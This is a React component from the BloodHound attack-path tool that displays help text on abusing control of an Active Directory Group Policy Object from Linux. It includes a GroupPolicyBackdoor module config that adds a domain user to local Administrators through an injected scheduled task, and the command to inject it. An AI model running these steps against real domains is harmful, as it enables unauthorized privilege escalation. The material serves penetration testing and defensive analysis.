// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps> = () => {
    return (
        <>
            <Typography variant='body2'>
                If you control a GPO linked to a target object, you may make modifications to that GPO in order to inject malicious configurations into it. 
                You could for instance add a Scheduled Task that will then be executed by all of the computers and/or users to which the GPO applies, 
                thus compromising them. Note that some configurations (such as Scheduled Tasks) implement item-level targeting, allowing 
                to precisely target a specific object.
                GPOs are applied every 90 minutes for standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain controllers.
            </Typography>

             <Typography variant='body2'>
                        The <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool can be used to perform the attack from a Linux machine. First, define a module file that describes the configuration to inject. 
                        The following one defines a computer configuration, with an immediate Scheduled Task adding a domain user as local administrator. 
                        A filter is defined, so that it only applies to a specific target.
                    </Typography>

                    <Typography component={'pre'}>
                            {
                                '[MODULECONFIG]\n' +
                                'name = Scheduled Tasks\n' +
                                'type = computer\n' +
                                '\n' +
                                '[MODULEOPTIONS]\n' +
                                'task_type = immediate\n' +
                                'program = cmd.exe\n' +
                                'arguments = /c "net localgroup Administrators corp.com\john /add"\n' +
                                '\n' +
                                '[MODULEFILTERS]\n' +
                                'filters = [{ "operator": "AND", "type": "Computer Name", "value": "srv1.corp.com"}]'
                            }
                    </Typography>

                     <Typography variant='body2'>
                        Place the described configuration into the Scheduled_task_add.ini file, and inject it into the target GPO with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                     </Typography>

                    <Typography variant='body2'>
                        Alternatively, <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Hackndo/pyGPOAbuse'>
                             pyGPOAbuse.py 
                        </Link>{' '}
                         can be used for that purpose.
                    </Typography>
        </>
    );
};

export default LinuxAbuse;
